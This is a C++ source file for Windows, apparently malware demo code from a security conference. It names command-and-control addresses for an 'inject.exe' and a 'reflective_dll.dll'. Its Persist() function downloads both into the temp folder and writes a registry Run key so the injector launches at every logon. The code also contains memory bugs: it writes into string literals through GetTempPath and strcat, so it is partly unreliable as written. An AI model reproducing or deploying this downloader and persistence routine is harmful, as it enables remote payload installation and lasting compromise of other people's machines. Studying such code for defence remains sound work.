#include <windows.h>
#include <Shlobj.h>
#include <string>
#include <fstream>
#include <iostream>

#include "utilities.h"
#include "FileOverWeb.h"

char* C2_exe_address = "bsideslv.da.best.com/inject.exe";
char* C2_dll_address = "bsideslv.da.best.com/reflective_dll.dll";

std::wstring GetStartupFolderPath()
{
	PWSTR pszPath;

	HRESULT hr = SHGetKnownFolderPath((REFKNOWNFOLDERID)FOLDERID_Startup,
		0,     // no special options required
		NULL,  // no access token required
		&pszPath);

	if (SUCCEEDED(hr))
	{
		// The function succeeded, so copy the returned path to a
		// C++ string, free the memory allocated by the function,
		// and return the path string.
		std::wstring path(pszPath);
		CoTaskMemFree(static_cast<LPVOID>(pszPath));
		return path;
	}
	else
	{
		// The function failed, so handle the error.
		// ...
		// You might want to throw an exception, or just return an
		// empty string here.
		throw std::runtime_error("The SHGetKnownFolderPath function failed");
	}
}

void copy_file(const char* srce_file, const char* dest_file)
{
	std::ifstream srce(srce_file, std::ios::binary);
	std::ofstream dest(dest_file, std::ios::binary);
	dest << srce.rdbuf();
}

std::wstring GetDirectory() {
	wchar_t infoBuf[MAX_PATH];
	// Get the current working directory
	if (!GetCurrentDirectoryW(_countof(infoBuf), infoBuf)) {
		throw std::exception("Failed to get current directory!");
	}
	return infoBuf; // will create a temporary wstring object and return that.
}

void Persist() {
	char*  tempDllPath = "";
	GetTempPath(MAX_PATH, tempDllPath);
	tempDllPath = strcat(tempDllPath, "reflective_dll.dll");
	GetUrlOverHttp(C2_dll_address, tempDllPath);

	char* tempExePath = "";
	GetTempPath(MAX_PATH, tempExePath);
	tempExePath = strcat(tempExePath, "inject.exe");
	GetUrlOverHttp(C2_exe_address, tempExePath);

	std::string reg_add_value = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v LazyS /t REG_SZ /d \"\"" + std::string(tempExePath) + "\"\"";
	cout << reg_add_value <<endl;
	system(reg_add_value.c_str());
}
